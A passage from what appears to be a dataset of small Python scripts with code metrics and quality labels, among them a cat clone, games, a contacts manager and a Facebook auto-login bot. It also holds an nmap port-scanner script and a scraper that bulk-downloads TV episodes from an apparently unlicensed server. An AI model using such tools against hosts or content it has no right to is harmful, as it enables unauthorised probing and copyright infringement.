python3 cat.py [filename1] [filename2] etc...
Separate filenames with spaces.

David Costell (DontEatThemCookies on GitHub)
v2 - 03/12/2022
""""""
import sys

def with_files(files):
    """"""Executes when file(s) is/are specified.""""""
    try:
        # Read each file's contents and store them
        file_contents = [contents for contents in [open(file).read() for file in files]]
    except OSError as err:
        # This executes when there's an error (e.g. FileNotFoundError)
        exit(print(f""cat: error reading files ({err})""))

    # Write all file contents into the standard output stream
    for contents in file_contents:
        sys.stdout.write(contents)

def no_files():
    """"""Executes when no file(s) is/are specified.""""""
    try:
        # Get input, output the input, repeat
        while True:
            print(input())
    # Graceful exit for Ctrl + C, Ctrl + D
    except KeyboardInterrupt:
        exit()
    except EOFError:
        exit()

def main():
    """"""Entry point of the cat program.""""""
    # Read the arguments passed to the program
    if not sys.argv[1:]:
        no_files()
    else:
        with_files(sys.argv[1:])

if __name__ == ""__main__"":
    main()
",1786,28,23,9,6,9,18,3.0,11,2,2,3.0,3,,5,6.754887502163469,11.60964047443681,1.0,alto,No,True,False,,id350
largestno.py,"# Python Program to find Largest of two Numbers using if-else statements
a = int(input(""Enter the first number: ""))
b = int(input(""Enter the second number: ""))
if(a >= b):
  print(a, ""is greater"")
else:
  print(b, ""is greater"")
",228,6,6,0,1,1,0,0.0,0,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,No,True,False,Low,id351
positiveNegetive.py,"n = int(input(""Enter number: ""))
if n > 0:
    print(""Number is positive"")
else:
    print(""Number is negative"")
",113,5,5,0,0,0,0,0.0,0,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,medio,No,True,False,Low,id352
nmap_scan.py,"from __future__ import print_function

import optparse  # Import the module

import nmap  # Import the module


# Script Name		: nmap_scan.py
# Author				: Craig Richards
# Created				: 24th May 2013
# Last Modified		:
# Version				: 1.0
# Modifications		:
# Description			: This scans my scripts directory and gives a count of the different types of scripts, you need nmap installed to run this


def nmapScan(tgtHost, tgtPort):  # Create the function, this fucntion does the scanning
    nmScan = nmap.PortScanner()
    nmScan.scan(tgtHost, tgtPort)
    state = nmScan[tgtHost][""tcp""][int(tgtPort)][""state""]
    print(""[*] "" + tgtHost + "" tcp/"" + tgtPort + "" "" + state)


def main():  # Main Program
    parser = optparse.OptionParser(
        ""usage%prog "" + ""-H <host> -p <port>""
    )  # Display options/help if required
    parser.add_option(""-H"", dest=""tgtHost"", type=""string"", help=""specify host"")
    parser.add_option(""-p"", dest=""tgtPort"", type=""string"", help=""port"")
    (options, args) = parser.parse_args()
    tgtHost = options.tgtHost
    tgtPorts = str(options.tgtPort).split("","")

    if (tgtHost == None) | (tgtPorts[0] == None):
        print(parser.usage)
        exit(0)

    for tgtPort in tgtPorts:  # Scan the hosts with the ports etc
        nmapScan(tgtHost, tgtPort)


if __name__ == ""__main__"":
    main()
",1377,22,24,12,13,7,0,2.0,4,10,3,20.0,19,,30,85.46551025759159,133.78294855911892,1.5789473684210529,alto,No,False,False,Low,id353
contacts.py,"# code by @JymPatel
# edited by @bupboi1337, (editors can put their name here && thanks for contribution :)

# this code uses GPL V3 LICENSE
## check license it https://github.com/JymPatel/Python-FirstEdition/blob/Main/LICENSE
print(""this code uses GPL V3 LICENSE"")
print("""")

# start of code
# import library
import pickle
import os

# get array from pickle data
infile = open('data/pickle-main', 'rb')
# defining array
array = pickle.load(infile)
infile.close()

# get key if path exists
keyacess = False
path = 'data/pickle-key'
if os.path.isfile('data/pickle-key'):
    pklekey = open('data/pickle-key', 'rb')
    key = pickle.load(pklekey)
    pklekey.close()
    if key == 'SKD0DW99SAMXI19#DJI9':
        keyacess = True
        print(""key found & is correct"")
        print(""ALL FEATURES ENABLED"")
    else:
        print(""key is WRONG\nSOME FEATURES ARE DISABLED"")
        print(""check https://github.com/JymPatel/Python-FirstEdition/tree/Main/PyPrograms/contacts for key, it's free"")
        print(""key isn't added to this repo check above repo"")
else:
    print(""key not found\nSOME FEATURES ARE DISABLED"")
    print(""check https://github.com/JymPatel/Python-FirstEdition/tree/Main/PyPrograms/contacts for key, it's free"")

print("""")
print(""update-22.02 ADDS SAVING YOUR DATA WHEN CLOSED BY SAVING USING OPTION 0\n##"")

# for ease in reading
fname = 0
lname = 1
number = 2
email = 3
# getting some variables
promptvar = 0 # variable for prompt
loopvar = 0 # variable for main loop
# making loop to run
while loopvar < 1:
    # ask user what to do
    print("""")  # putting blank line before running new loop
    if promptvar == 0:
        print(""0.  exit program"")
        print(""1.  get all contacts"")
        print(""2.  add new contact"")
        print(""3.  remove any contact"")
        print(""4.  sort contacts by first name"")
        print(""9.  stop getting this prompt"")

    a = input(""WHAT WOULD YOU LIKE TO DO?  "")

    # check for integer & calculate length of array
    try:
        a = int(a)
    except ValueError:
        print(""!! PLEASE ENTER AN INTEGRAL VALUE"")
    # get length of array
    arraylen = len(array[fname])

    # if option 1 is selected
    if a == 1:
        print("""")
        print(""== YOUR CONTACT LIST =="")
        print("""")
        i1 = 0
        # print all names
        while i1 < arraylen:
            print(f""{array[fname][i1]} {array[lname][i1]},  {array[number][i1]}  {array[email][i1]}"")
            i1 += 1
        print(""======================="")

    # option 2 is selected
    elif a == 2:
        # get a new contact
        array[fname].append(input(""First Name: ""))
        array[lname].append(input(""Last Name: ""))
        array[number].append(input(""Phone Number: ""))
        array[email].append(input(""email ID: ""))
        arraylen += 1

    # option 3
    elif a == 3:
        print(""which contact would you like to delete? (enter first name)"")
        print(""enter '\nSTOP' to STOP deleting contact"")
        rmcontact = input(""INPUT:  "")
        if rmcontact != '\nSTOP':
            tempvar = 0
            rmvar = 0
            for i in range(arraylen):
                if array[fname][i].upper() == rmcontact.upper():
                    tempvar += 1
                    rmvar = i
            # if no cotacts found
            if tempvar == 0:
                print(""no cantact matches first name provided"")
            # if only one contact is found
            elif tempvar == 1:
                print(""DO YOU WANT TO DELETE CONTACT"")
                for i in range(4):
                    print(array[i][rmvar])
                tempinp = input(""y/n?  "")
                if tempinp == 'y' or tempinp == 'Y':
                    for i in range(4):
                        del array[i][rmvar]
                    print(""contact REMOVED."")
                else:
                    print(""failed to REMOVE contact"")
            # if more than one contact is found
            else:
                print(""there are more than one contact with same name"")
                # TODO



    # if option 4 is selected
    elif a == 4:
        if keyacess == True:
            sortcounter = 1
            while sortcounter != 0:
                # reset counter
                sortcounter = 0
                arraylen = len(array[fname])
                for i in range(arraylen - 1):
                    if array[fname][i].upper() > array[fname][i + 1].upper():
                        for j in range(4):
                            temp = array[j][i]
                            array[j][i] = array[j][i + 1]
                            array[j][i + 1] = temp
                        # add one for changing values
                        sortcounter += 1
                    if array[fname][i].upper() == array[fname][i + 1].upper():
                        # if first name are same, compare last
                        if array[lname][i].upper() > array[lname][i + 1].upper():
                            for j in range(4):
                                temp = array[j][i]
                                array[j][i] = array[j][i + 1]
                                array[j][i + 1] = temp
                            # add one for changing values
                            sortcounter += 1
            # if no values are swapped, sortcounter = 0; no next loop
            print(""CONTACTS ARE NOW SORTED"")
        else:
            print(""NEED CORRECT KEY TO ENABLE THIS FEATURE"")

    # option 9
    elif a == 9:
        if keyacess:
            # change prompt settings
            if promptvar == 0: 
                promptvar += 1
                print(""you won't get prompt now!"")
                print(""ENTER 9 AGAIN TO START GETTING PROMPT AGAIN!!"")
            else:
                promptvar -= 1
        else:
            print(""NEED CORRECT KEY TO ENABLE THIS FEATURE"")


    # if option 0 is selected
    elif a == 0:
        print(""Saving your Data ..."")
        outfile = open('data/pickle-main', 'wb')
        pickle.dump(array, outfile)
        outfile.close()
        print(""YOUR DATA HAS BEEN SAVED SUCESSFULLY!"")
        loopvar += 1

    # if no true option is selected
    else:
        print(""!! PLEASE ENTER VALUE FROM GIVEN INTEGER"")

# end of code
print("""")
print(""get this code at https://github.com/JymPatel/Python-FirstEdition"")
",6323,132,132,19,38,35,0,0.0,0,39,7,78.0,32,,117,179.65148445440323,618.3920596068831,8.53125,medio,No,True,False,High,id354
convert celsius into fahrenheit.py,"cels= float(input(""enter temp in celsius""))
print(""temprature in celsius is :"",cels)
fahr = cels*9/5+32
print(""temprature in fahrenhite is :"",fahr)
",148,4,4,0,0,0,0,0.0,0,3,3,6.0,6,,9,20.264662506490406,28.529325012980813,1.5,medio,No,True,False,Low,id355
soundex_algorithm.py,"def soundex_al(word):
    cap_word = word.upper()  # convert the word to uppercase

    return_val = """"
    return_val = """" + cap_word[0]  # get the first letter of the word

    # dictonary to give values to the letters
    code_dict = {""BFPV"": ""1"", ""CGJKQSXZ"": ""2"", ""DT"": ""3"", ""L"": ""4"", ""MN"": ""5"", ""R"": ""6""}

    # array of charactors to remove from the word
    rem_charactors = [""A"", ""E"", ""I"", ""O"", ""U"", ""H"", ""W"", ""Y""]

    # for loop to remove all the 0 valued charactors
    temp = """"
    for char in cap_word[1:]:
        if char not in rem_charactors:
            temp = temp + char

    # get the values from the 'code_dict' and create the soundex code
    for char in temp:
        for key in code_dict.keys():
            if char in key:
                code = code_dict[key]
                if code != return_val[-1]:  # Remove all pairs of consecutive digits.
                    return_val += code

    return_val = return_val[:4]  # crop the word to 4 charactors

    # if soundex code doen't contain 4 digits. fill it with zeros
    if len(return_val) < 4:
        for x in range(len(return_val), 4):
            return_val = return_val + ""0""

    # return the value
    return return_val


# testing the fucntion
print(soundex_al(""Danus""))
",1257,24,22,10,11,7,0,1.0,9,9,6,17.0,13,,26,63.61549134016113,110.44611534953322,3.923076923076923,alto,No,False,False,Low,id356
swap.py,"class Swapper:
    """"""
    A class to perform swapping of two values.

    Methods:
    -------
    swap_tuple_unpacking(self):
        Swaps the values of x and y using a tuple unpacking method.
    
    swap_temp_variable(self):
        Swaps the values of x and y using a temporary variable.
    
    swap_arithmetic_operations(self):
        Swaps the values of x and y using arithmetic operations.

    """"""

    def __init__(self, x, y):
        """"""
        Initialize the Swapper class with two values.

        Parameters:
        ----------
        x : int
            The first value to be swapped.
        y : int
            The second value to be swapped.

        """"""
        if not isinstance(x, (int, float)) or not isinstance(y, (float, int)):
            raise ValueError(""Both x and y should be integers."")
        
        self.x = x
        self.y = y

    def display_values(self, message):
        print(f""{message} x: {self.x}, y: {self.y}"")

    def swap_tuple_unpacking(self):
        """"""
        Swaps the values of x and y using a tuple unpacking method.

        """"""
        self.display_values(""Before swapping"")
        self.x, self.y = self.y, self.x
        self.display_values(""After swapping"")

    def swap_temp_variable(self):
        """"""
        Swaps the values of x and y using a temporary variable.

        """"""
        self.display_values(""Before swapping"")
        temp = self.x
        self.x = self.y
        self.y = temp
        self.display_values(""After swapping"")

    def swap_arithmetic_operations(self):
        """"""
        Swaps the values of x and y using arithmetic operations.

        """"""
        self.display_values(""Before swapping"")
        self.x = self.x - self.y
        self.y = self.x + self.y
        self.x = self.y - self.x
        self.display_values(""After swapping"")


print(""Example 1:"")
swapper1 = Swapper(5, 10)
swapper1.swap_tuple_unpacking()
print()

print(""Example 2:"")
swapper2 = Swapper(100, 200)
swapper2.swap_temp_variable()
print()
",2014,37,32,18,0,0,29,5.0,9,6,4,10.0,6,10.0,16,23.509775004326936,53.1508495181978,3.333333333333333,medio,Yes,False,False,Low,id357
one_rep_max_calculator.py,"class OneRepMaxCalculator:
    """"""
    A class to calculate the one-repetition maximum (1RM) for a weightlifting exercise.
    """"""

    def __init__(self):
        """"""
        Initializes the OneRepMaxCalculator with default values.
        """"""
        self.weight_lifted = 0
        self.reps_performed = 0

    def get_user_input(self):
        """"""
        Prompts the user to enter the weight lifted and the number of reps performed.
        """"""
        self.weight_lifted = int(input(""Enter the weight you lifted (in kg): ""))
        self.reps_performed = int(input(""Enter the number of reps you performed: ""))

    def calculate_one_rep_max(self):
        """"""
        Calculates the one-rep max based on the Epley formula.
        """"""
        return (self.weight_lifted * self.reps_performed * 0.0333) + self.weight_lifted

    def display_one_rep_max(self):
        """"""
        Displays the calculated one-rep max.
        """"""
        one_rep_max = self.calculate_one_rep_max()
        print(f""Your estimated one-rep max (1RM) is: {one_rep_max} kg"")


def main():
    """"""
    The main function that creates an instance of OneRepMaxCalculator and uses it to get user input,
    calculate the one-rep max, and display the result.
    """"""
    calculator = OneRepMaxCalculator()
    calculator.get_user_input()
    calculator.display_one_rep_max()


if __name__ == ""__main__"":
    main()
",1390,24,18,8,0,0,19,5.0,7,4,3,8.0,7,,12,24.406371956566694,39.86313713864836,1.7142857142857142,alto,Yes,True,False,Low,id358
facebook-autologin-bot.py,"import pyttsx3
import time
from selenium import webdriver

tts = pyttsx3.init()
rate = tts.getProperty(""rate"")
newVoiceRate = 160
tts.setProperty(""rate"", newVoiceRate)


def welcome():
    print("">"")
    print(""Welcome to Autobot created by Vijay.Use exit or quite to exit."")
    text = ""Welcome to Autobot created by Vijay""
    speak(text)
    time.sleep(1)
    text = ""Use exit or quite to exit.""
    speak(text)
    print(""<"")


def speak(text):
    tts.say(text)
    tts.runAndWait()


welcome()
t = 1
while t == 1:
    text = str(input("">>""))
    if ""hello"" in text:
        text = ""hello my name is Autobot""
        print(""hello my name is Autobot"")
        speak(text)
        text = ""I can autologin to your social sites like facebook twitter github and instagram""
        print(
            ""I can autologin to your social sites like facebook twitter github and instagram""
        )
        speak(text)
        continue
    if ""facebook"" or ""fb"" in text:
        print(""Opening Your Facebook Account"")
        text = ""Opening Your Facebook Account""
        speak(text)
        # your username and password here
        username = ""your username""
        password = ""yourpassword""
        # download webdriver of suitable version by link below
        # https://sites.google.com/a/chromium.org/chromedriver/downloads
        # locate your driver
        driver = webdriver.Chrome(""C:\\Users\\AJAY\\Desktop\\chromedriver.exe"")
        url = ""https://www.facebook.com""
        print(""Opening facebook..."")
        driver.get(url)
        driver.find_element_by_id(""email"").send_keys(username)
        print(""Entering Your Username..."")
        time.sleep(1)
        driver.find_element_by_id(""pass"").send_keys(password)
        print(""Entering Your password..."")
        driver.find_element_by_name(""login"").click()
        time.sleep(4)
        print(""Login Successful"")
        text = ""Login Successful Enjoy your day sir""
        speak(text)
        continue
    else:
        print(""input valid statement"")
        continue
",2034,55,57,7,4,4,0,2.0,2,4,3,8.0,7,,12,24.406371956566694,39.86313713864836,1.7142857142857142,medio,No,True,False,Low,id359
prison_break_scrapper.py,"""""""
Scrapper for downloading prison break
series from an open server and putting them in a designated folder.
""""""
import os
import subprocess

import requests as req
from bs4 import BeautifulSoup as bs

BASE_URL = ""http://dl.funsaber.net/serial/Prison%20Break/season%20""


def download_files(links, idx):
    for link in links:
        subprocess.call(
            [""aria2c"", ""-s"", ""16"", ""-x"", ""16"", ""-d"", ""season"" + str(idx), link]
        )


def main():
    for i in range(1, 5):
        r = req.get(BASE_URL + str(i) + ""/1080/"")
        soup = bs(r.text, ""html.parser"")
        link_ = []
        for link in soup.find_all(""a""):
            if "".mkv"" in link.get(""href""):
                link_.append(BASE_URL + str(i) + ""/1080/"" + link.get(""href""))
        if not os.path.exists(""season"" + str(i)):
            os.makedirs(""season"" + str(i))
        download_files(link_, i)


if __name__ == ""__main__"":
    main()
",920,22,23,8,0,0,4,2.0,7,11,4,21.0,18,,32,83.05865002596161,142.7018117963935,2.333333333333333,medio,No,False,False,Low,id360
blackjack_simulate.py,"import os
import random
from functools import namedtuple

""""""
Target: BlackJack 21 simulate
    - Role
        - Dealer: 1
            - Insurance: (When dealer Get A(1) face up)
                - When dealer got 21
                    - lost chips
                - When dealer doesn't got 21
                    - win double chips (Your Insurance)
        - Player: 1
            - Bet: (Drop chip before gambling start)
            - Hit: (Take other card from the dealer)
            - Stand: (No more card dealer may take card when rank under 17)
            - Double down: (When you got over 10 in first hand)
                           (Get one card)
            - Surrender: (only available as first decision of a hand)
                - Dealer return 50% chips
""""""

__author__ = ""Alopex Cheung""
__version__ = ""0.2""

BLACK_JACK = 21
BASE_VALUE = 17

COLOR = {
    ""PURPLE"": ""\033[1;35;48m"",
    ""CYAN"": ""\033[1;36;48m"",
    ""BOLD"": ""\033[1;37;48m"",
    ""BLUE"": ""\033[1;34;48m"",
    ""GREEN"": ""\033[1;32;48m"",
    ""YELLOW"": ""\033[1;33;48m"",
    ""RED"": ""\033[1;31;48m"",
    ""BLACK"": ""\033[1;30;48m"",
    ""UNDERLINE"": ""\033[4;37;48m"",
    ""END"": ""\033[1;37;0m"",
}


class Card:
    __slots__ = ""suit"", ""rank"", ""is_face""

    def __init__(self, suit, rank, face=True):
        """"""
        :param suit: patter in the card
        :param rank: point in the card
        :param face: show or cover the face(point & pattern on it)
        """"""
        self.suit = suit
        self.rank = rank
        self.is_face = face

    def __repr__(self):
        fmt_card = ""\t<rank: {rank:2}, suit: {suit:8}>""
        if self.is_face:
            return fmt_card.format(suit=self.suit, rank=self.rank)
        return fmt_card.format(suit=""*-Back-*"", rank=""*-Back-*"")

    def show(self):
        print(str(self))


class Deck:
    def __init__(self, num=1):
        """"""
        :param num: the number of deck
        """"""
        self.num = num
        self.cards = []
        self.built()

    def __repr__(self):
        return ""\n"".join([str(card) for card in self.cards])

    def __len__(self):
        return len(self.cards)

    def built(self):
        for _ in range(self.num):
            ranks = [x for x in range(1, 14)]
            suits = ""Spades Heart Clubs Diamonds"".split()
            for suit in suits:
                for rank in ranks:
                    card = Card(suit, rank)
                    self.cards.append(card)

    def shuffle(self):
        for _ in range(self.num):
            for index in range(len(self.cards)):
                i = random.randint(0, 51)
                self.cards[index], self.cards[i] = self.cards[i], self.cards[index]

    def rebuilt(self):
        self.cards.clear()
        self.built()

    def deliver(self):
        return self.cards.pop()


class Chips:
    def __init__(self, amount):
        """"""
        :param amount: the chips you own
        """"""
        self._amount = amount
        self._bet_amount = 0
        self._insurance = 0
        self.is_insurance = False
        self.is_double = False

    def __bool__(self):
        return self.amount > 0

    @staticmethod
    def get_tips(content):
        fmt_tips = ""{color}** TIPS: {content}! **{end}""
        return fmt_tips.format(
            color=COLOR.get(""YELLOW""), content=content, end=COLOR.get(""END"")
        )

    @property
    def amount(self):
        return self._amount

    @amount.setter
    def amount(self, value):
        if not isinstance(value, int):
            type_tips = ""Please give a integer""
            raise ValueError(Chips.get_tips(type_tips))
        if value < 0:
            amount_tips = ""Your integer should bigger than 0""
            raise ValueError(Chips.get_tips(amount_tips))
        self._amount = value

    @property
    def bet_amount(self):
        return self._bet_amount

    @bet_amount.setter
    def bet_amount(self, value):
        type_tips = ""Please give a integer""
        amount_tips = ""Your chips should between 1 - "" + str(self.amount) + "" ""
        try:
            value = int(value)
        except ValueError:
            raise ValueError(Chips.get_tips(type_tips))
        else:
            if not isinstance(value, int):
                raise ValueError(Chips.get_tips(type_tips))
            if (value <= 0) or (value > self.amount):
                raise ValueError(Chips.get_tips(amount_tips))
            self._bet_amount = value

    def double_bet(self):
        if self.can_double():
            self._bet_amount *= 2
            self.is_double = True
        else:
            over_tips = ""Not enough chips || ""
            cannot_double = ""CAN'T DO DOUBLE""
            raise ValueError(Chips.get_tips(over_tips + cannot_double))

    @property
    def insurance(self):
        return self._insurance

    @insurance.setter
    def insurance(self, value):
        if self.amount - value < 0:
            over_tips = ""Not enough chips""
            raise ValueError(Chips.get_tips(over_tips))
        self._insurance = value
        self.is_insurance = True

    def current_amount(self):
        return self.amount - self.bet_amount - self.insurance

    def reset_chip(self):
        self._bet_amount = 0
        self._insurance = 0
        self.is_double = False
        self.is_insurance = False

    def can_double(self):
        return self.current_amount() - self.bet_amount >= 0


class User:
    def __init__(self, name, role, chips_amount=None, color=""END""):
        """"""
        :param name: User name
        :param role: dealer or player
        :param chips_amount: Casino tokens equal money
        """"""
        self.name = name
        self.prompt = ""{role} >> ({name}) : "".format(role=role, name=self.name)
        self.chips = Chips(chips_amount)
        self.color = color
        self.hand = []
        self.point = 0

    def __repr__(self):
        return str(self.__dict__)

    def obtain_card(self, deck, face=True):
        card = deck.deliver()
        card.is_face = face
        self.hand.append(card)

    def drop_card(self):
        self.hand.clear()
        self.point = 0

    def show_card(self):
        print(""\t    ** Here is my card **"")
        for card in self.hand:
            card.show()

    def unveil_card(self):
        for card in self.hand:
            card.is_face = True
        self.show_card()

    def calculate_point(self):
        def _extract_rank():
            raw_ranks = [card.rank for card in self.hand]
            cook_ranks = [10 if rank > 10 else rank for rank in raw_ranks]
            return cook_ranks

        def _sum_up(ranks):
            rank_one = sum(ranks)
            rank_eleven = sum([11 if rank == 1 else rank for rank in ranks])
            # Over or has 2 Ace
            if (ranks[::-1] == ranks) and (1 in ranks):
                return 11 + len(ranks) - 1
            if rank_eleven <= BLACK_JACK:
                return rank_eleven
            return rank_one

        points = _extract_rank()
        self.point = _sum_up(points)

    def is_point(self, opt, point):
        self.calculate_point()
        compare_fmt = ""{user_point} {opt} {point}"".format(
            user_point=self.point, opt=opt, point=point
        )
        return eval(compare_fmt)

    def speak(self, content="""", end_char=""\n""):
        print("""")
        print(
            COLOR.get(self.color) + self.prompt + COLOR.get(""END"") + content,
            end=end_char,
        )

    def showing(self):
        self.speak()
        self.show_card()

    def unveiling(self):
        self.calculate_point()
        points_fmt = ""My point is: {}"".format(str(self.point))
        self.speak(points_fmt)
        self.unveil_card()


class Dealer(User):
    def __init__(self, name):
        super().__init__(name=name, role=""Dealer"", color=""PURPLE"")
        self.trigger = 0

    def ask_insurance(self):
        buy_insurance = (
            ""(Insurance pay 2 to 1)\n""
            ""\tMy Face card is an Ace.\n""
            ""\tWould your like buy a insurance ?""
        )
        self.speak(content=buy_insurance)

    def strategy_trigger(self, deck):
        if self.is_point(""<"", BASE_VALUE):
            self.obtain_card(deck)
        else:
            self.trigger += random.randint(0, 5)
            if self.trigger % 5 == 0:
                self.obtain_card(deck)


class Player(User):
    def __init__(self, name, amount):
        super().__init__(name=name, chips_amount=amount, role=""Player"", color=""CYAN"")
        self.refresh_prompt()

    def refresh_prompt(self):
        self.prompt = ""{role} [ ${remain} ] >> ({name}) : "".format(
            role=""Player"", name=self.name, remain=self.chips.current_amount()
        )

    def select_choice(self, pattern):
        my_turn = ""My turn now.""
        self.speak(content=my_turn)
        operation = {
            ""I"": ""Insurance"",
            ""H"": ""Hit"",
            ""S"": ""Stand"",
            ""D"": ""Double-down"",
            ""U"": ""Surrender"",
        }
        enu_choice = enumerate((operation.get(p) for p in pattern), 1)
        dict_choice = dict(enu_choice)
        for index, operator in dict_choice.items():
            choice_fmt = ""\t[{index}] {operation}""
            print(choice_fmt.format(index=index, operation=operator))
        return dict_choice


class Recorder:
    def __init__(self):
        self.data = []
        self.winner = None
        self.remain_chips = 0
        self.rounds = 0
        self.player_win_count = 0
        self.dealer_win_count = 0
        self.player_point = 0
        self.dealer_point = 0

    def update(self, winner, chips, player_point, dealer_point):
        self.rounds += 1
        self.remain_chips = chips
        self.winner = winner
        if self.winner == ""Player"":
            self.player_win_count += 1
        elif self.winner == ""Dealer"":
            self.dealer_win_count += 1
        self.player_point = player_point
        self.dealer_point = dealer_point

    def record(self, winner, chips, player_point, dealer_point):
        self.update(winner, chips, player_point, dealer_point)
        Row = namedtuple(
            ""Row"", [""rounds"", ""player_point"", ""dealer_point"", ""winner"", ""remain_chips""]
        )
        row = Row(
            self.rounds,
            self.player_point,
            self.dealer_point,
            self.winner,
            self.remain_chips,
        )
        self.data.append(row)

    def draw_diagram(self):
        content = ""Record display""
        bars = ""--"" * 14
        content_bar = bars + content + bars
        base_bar = bars + ""-"" * len(content) + bars

        os.system(""clear"")
        print(base_bar)
        print(content_bar)
        print(base_bar)
        self.digram()
        print(base_bar)
        print(content_bar)
        print(base_bar)

    def digram(self):
        title = ""Round\tPlayer-Point\tDealer-Point\tWinner-is\tRemain-Chips""
        row_fmt = ""{}\t{}\t\t{}\t\t{}\t\t{}""

        print(title)
        for row in self.data:
            print(
                row_fmt.format(
                    row.rounds,
                    row.player_point,
                    row.dealer_point,
                    row.winner,
                    row.remain_chips,
                )
            )

        print("""")
        win_rate_fmt = "">> Player win rate: {}%\n>> Dealer win rate: {}%""
        try:
            player_rate = round(self.player_win_count / self.rounds * 100, 2)
            dealer_rate = round(self.dealer_win_count / self.rounds * 100, 2)
        except ZeroDivisionError:
            player_rate = 0
            dealer_rate = 0
        print(win_rate_fmt.format(player_rate, dealer_rate))


class BlackJack:
    def __init__(self, username):
        self.deck = Deck()
        self.dealer = Dealer(""Bob"")
        self.player = Player(username.title(), 1000)
        self.recorder = Recorder()
        self.go_on = True
        self.first_hand = True
        self.choice = None
        self.winner = None
        self.bust = False
        self.res = None

    def play(self):
        while self.player.chips:
            self.initial_game()
            self.in_bet()
            self.deal_card()
            while self.go_on:
                self.choice = self.menu()
                # self.player.speak()
                self.chips_manage()
                try:
                    self.card_manage()
                except ValueError as res:
                    self.bust = True
                    self.go_on = False
                    self.res = res
            if not self.bust:
                self.is_surrender()
            self.winner = self.get_winner()
            self.res = ""Winner is "" + self.winner
            os.system(""clear"")
            self.calculate_chips()
            self.result_exhibit()
            self.dealer.unveiling()
            self.player.unveiling()
            self.recorder.record(
                self.winner,
                self.player.chips.amount,
                self.player.point,
                self.dealer.point,
            )

        self.recorder.draw_diagram()
        ending = ""\n\tSorry I lost all chips!\n\tTime to say goodbye.""
        self.player.speak(ending)
        print(""\n"" + ""-"" * 20 + "" End Game "" + ""-"" * 20)

    def initial_game(self):
        self.go_on = True
        self.first_hand = True
        self.choice = None
        self.winner = None
        self.bust = False
        self.deck.rebuilt()
        self.deck.shuffle()
        self.player.chips.reset_chip()
        self.player.drop_card()
        self.player.refresh_prompt()
        self.dealer.drop_card()
        print(""\n"" + ""-"" * 20 + "" Start Game "" + ""-"" * 20)

    def in_bet(self):
        in_bet = ""\n\tI want to bet: ""
        not_invalid = True
        self.player.speak(in_bet, end_char="""")
        while not_invalid:
            try:
                self.player.chips.bet_amount = input()
            except ValueError as e:
                print(e)
                self.player.speak(in_bet, end_char="""")
                continue
            except KeyboardInterrupt:
                print("""")
                self.recorder.draw_diagram()
                quit()
            else:
                self.player.refresh_prompt()
                # self.player.speak()
                not_invalid = False

    def deal_card(self):
        # dealer
        self.dealer.obtain_card(self.deck, face=False)
        self.dealer.obtain_card(self.deck)

        # player
        self.player.obtain_card(self.deck)
        self.player.obtain_card(self.deck)

        self.dealer.showing()
        self.player.showing()

    def menu(self):
        pattern = ""HS""
        if self.first_hand:
            pattern += ""U""
            if self.dealer.hand[1].rank == 1 and self.player.chips.current_amount():
                pattern += ""I""
                self.dealer.ask_insurance()
            if self.player.is_point("">"", 10) and self.player.chips.can_double():
                pattern += ""D""
            self.first_hand = False
        choices = self.player.select_choice(pattern)
        select = self.get_select(len(choices), general_err=""Select above number."")
        return choices[select]

    @staticmethod
    def get_select(select_max, prompt="">> "", general_err=""""):
        while True:
            try:
                value = input(prompt)
                select = int(value)
                if select > select_max:
                    raise ValueError
            except ValueError:
                print(general_err)
                continue
            except KeyboardInterrupt:
                print("""")
                quit()
            else:
                return select

    def chips_manage(self):
        if self.choice == ""Insurance"":
            err = ""The amount should under "" + str(self.player.chips.current_amount())
            pay_ins = self.get_select(
                self.player.chips.current_amount(),
                prompt=""Insurance amount >> "",
                general_err=err,
            )
            self.player.chips.insurance = pay_ins

        if self.choice == ""Double-down"":
            try:
                self.player.chips.double_bet()
            except ValueError as e:
                print(e)
        self.player.refresh_prompt()
        if self.choice in (""Insurance"", ""Double-down"", ""Surrender""):
            self.go_on = False

    def card_manage(self):
        if self.choice in (""Hit"", ""Double-down""):
            self.player.obtain_card(self.deck)
            if self.player.is_point("">"", BLACK_JACK):
                raise ValueError(""Player BUST"")
            else:
                self.dealer.strategy_trigger(self.deck)
                if self.dealer.is_point("">"", BLACK_JACK):
                    raise ValueError(""Dealer BUST"")
        elif self.choice != ""Surrender"":
            if not self.player.chips.is_insurance:
                self.dealer.strategy_trigger(self.deck)
                if self.dealer.is_point("">"", BLACK_JACK):
                    raise ValueError(""Dealer BUST"")

        self.dealer.showing()
        self.player.showing()
        if self.choice in (""Double-down"", ""Stand""):
            self.go_on = False

    def is_surrender(self):
        if self.choice == ""Surrender"":
            self.player.speak(""Sorry, I surrender....\n"")

    def get_winner(self):
        if self.bust:
            return ""Dealer"" if self.player.is_point("">"", BLACK_JACK) else ""Player""

        if self.choice == ""Surrender"":
            return ""Dealer""
        elif self.choice == ""Insurance"":
            if self.player.is_point(""=="", BLACK_JACK):
                return ""Dealer""
            return ""Player""

        if self.choice in (""Double-down"", ""Stand""):
            self.player.calculate_point()
            self.dealer.calculate_point()
            if self.player.point > self.dealer.point:
                return ""Player""
            return ""Dealer""

        return ""Both""

    def calculate_chips(self):
        if self.choice == ""Surrender"":
            if self.player.chips.bet_amount == 1:
                if self.player.chips.current_amount() == 0:
                    self.player.chips.amount = 0
            else:
                surrender_amount = self.player.chips.bet_amount // 2
                self.player.chips.amount -= surrender_amount

        elif self.choice in (""Double-down"", ""Stand"", ""Insurance"", ""Hit""):
            if self.winner == ""Player"":
                self.player.chips.amount += (
                    self.player.chips.bet_amount + self.player.chips.insurance * 2
                )
            elif self.winner == ""Dealer"":
                self.player.chips.amount -= (
                    self.player.chips.bet_amount + self.player.chips.insurance
                )

    def result_exhibit(self):
        def get_color():
            if ""BUST"" in content:
                return COLOR.get(""RED"" if ""Player"" in content else ""GREEN"")
            if self.winner == ""Player"":
                return COLOR.get(""GREEN"")
            elif self.winner == ""Dealer"":
                return COLOR.get(""RED"")
            else:
                return COLOR.get(""YELLOW"")

        end = COLOR.get(""END"")
        content = str(self.res)
        color = get_color()
        winner_fmt = color + ""\n\t>> {content} <<\n"" + end
        print(winner_fmt.format(content=content))


def main():
    try:
        user_name = input(""What is your name: "")
    except KeyboardInterrupt:
        print("""")
    else:
        black_jack = BlackJack(username=user_name)
        black_jack.play()


if __name__ == ""__main__"":
    main()
",19597,457,509,90,5,5,34,,154,99,17,193.0,154,,292,1188.5719955682707,2166.0129343466824,10.652597402597404,bajo,Yes,True,True,Very High,id361
Web Socket.py,"# Program to print a data & it's Metadata of online uploaded file using ""socket"".
import socket
